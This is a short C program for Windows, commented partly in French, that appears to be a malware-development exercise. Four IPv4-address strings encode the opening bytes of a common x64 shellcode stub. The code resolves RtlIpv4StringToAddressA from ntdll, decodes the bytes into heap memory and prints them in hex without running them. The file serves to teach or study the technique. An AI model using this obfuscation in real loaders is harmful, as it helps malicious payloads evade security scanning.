#include <stdio.h>
#include <Windows.h>
#include <stdlib.h> // Pour malloc
#define _CRT_SECURE_NO_WARNINGS

char* Ipv4Array[4] = {
    "252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81"
};

typedef NTSTATUS(NTAPI* fnRtlIpv4StringToAddressA)(
    PCSTR       S,
    BOOLEAN     Strict,
    PCSTR* Terminator,
    PVOID       Addr
    );

BOOL Ipv4Deobfuscation(IN CHAR* Ipv4Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {
    PBYTE           pBuffer = NULL;
    PBYTE           TmpBuffer = NULL;
    SIZE_T          sBuffSize = NULL;
    PCSTR           Terminator = NULL;
    NTSTATUS        STATUS = NULL;

    // Getting RtlIpv4StringToAddressA address from ntdll.dll
    fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("ntdll")), "RtlIpv4StringToAddressA");
    if (pRtlIpv4StringToAddressA == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Getting the real size of the shellcode which is the number of IPv4 addresses * 4
    sBuffSize = NmbrOfElements * 4;

    // Allocating memory which will hold the deobfuscated shellcode
    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Setting TmpBuffer to be equal to pBuffer
    TmpBuffer = pBuffer;

    // Loop through all the IPv4 addresses saved in Ipv4Array
    for (int i = 0; i < NmbrOfElements; i++) {

        // Deobfuscating one IPv4 address at a time
        // Ipv4Array[i] is a single ipv4 address from the array Ipv4Array
        if ((STATUS = pRtlIpv4StringToAddressA(Ipv4Array[i], FALSE, &Terminator, TmpBuffer)) != 0x0) {
            // if it failed
            printf("[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X", Ipv4Array[i], STATUS);
            return FALSE;
        }

        // 4 bytes are written to TmpBuffer at a time
        // Therefore Tmpbuffer will be incremented by 4 to store the upcoming 4 bytes
        TmpBuffer = (PBYTE)(TmpBuffer + 4);
    }

    // Save the base address & size of the deobfuscated payload
    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;

    return TRUE;
}

int main() {
    SIZE_T NmbrOfElements = sizeof(Ipv4Array) / sizeof(Ipv4Array[0]);
    PBYTE ppDAddress = NULL;
    SIZE_T pDSize = 0;
    printf("let's start our deobfuscation\n");
    if (Ipv4Deobfuscation(Ipv4Array, NmbrOfElements, &ppDAddress, &pDSize)) {
        printf("le payload est : \n");
        for (SIZE_T i = 0; i < pDSize; i++) {
            printf("%02X ", ppDAddress[i]);  // Afficher chaque octet en hexadécimal
        }
        printf("\nsuccess\n");
        // Free allocated memory
        HeapFree(GetProcessHeap(), 0, ppDAddress);
        return 0;
    }

    printf("error\n");
    return 0;
}
